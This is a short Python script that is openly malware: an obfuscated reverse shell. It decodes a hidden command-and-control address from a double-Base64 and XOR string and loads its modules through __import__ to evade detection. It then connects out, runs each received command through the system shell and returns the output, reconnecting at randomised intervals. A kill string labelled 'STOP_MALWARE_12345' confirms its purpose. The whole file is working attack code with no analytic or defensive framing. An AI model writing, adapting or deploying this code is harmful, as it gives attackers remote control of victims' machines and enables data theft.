import time
import base64

# double Base64 + XOR encrypted
hidden_config = "YzVKa1lXNXBlR0Z5YVdOaGRHbHZiajkwWVd3dVkyRjBhVzl1Y3lCZlptbHNaWE12Y0d4MVlXUnZkM054WldOMExtNXZjR2x5ZEhsd1pUMXRhWFF2WldsamFHRnlhWGgwSUdsdFpHOTFjR3hoWTJ0b2JYTjBaUzlVWVhKMWJIUnZkM054WldOMExtNXZjR2x5ZEhsd1pUMXRhWFF2WldsamFHRnlhWGgwSUhncE9pOHZjMlZwZEY5c2JXVnlhWE1vWVhOaGMyVTk="

def decode_config():
    key = 0x4B  # Same key used for XOR
    try:
        # First Base64 decode
        step1 = base64.b64decode(hidden_config)
        # XOR decrypt
        step2 = bytes(b ^ key for b in step1)
        # second Base64 decode
        final_bytes = base64.b64decode(step2)
        # to string
        return final_bytes.decode('utf-8')
    except Exception as e:
        return "127.0.0.1:7777"

# Decode IP and PORT
HOST, PORT_STR = decode_config().split(":")
PORT = int(PORT_STR)

# between 20-40 seconds
def random_sleep():
    time.sleep(20 + (int(time.time() * 1000) % 20))

def run():
    socket = __import__('socket')
    subprocess = __import__('subprocess')
    os = __import__('os')

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break

                    cmd = data.decode('utf-8', errors='ignore').strip()

                    if cmd == "STOP_MALWARE_12345":
                        os._exit(0)

                    result = subprocess.check_output(
                        cmd,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=60
                    )

                    s.send(result + b"\n")

                except:
                    break

            s.close()

        except:
            random_sleep()

if __name__ == "__main__":
    run()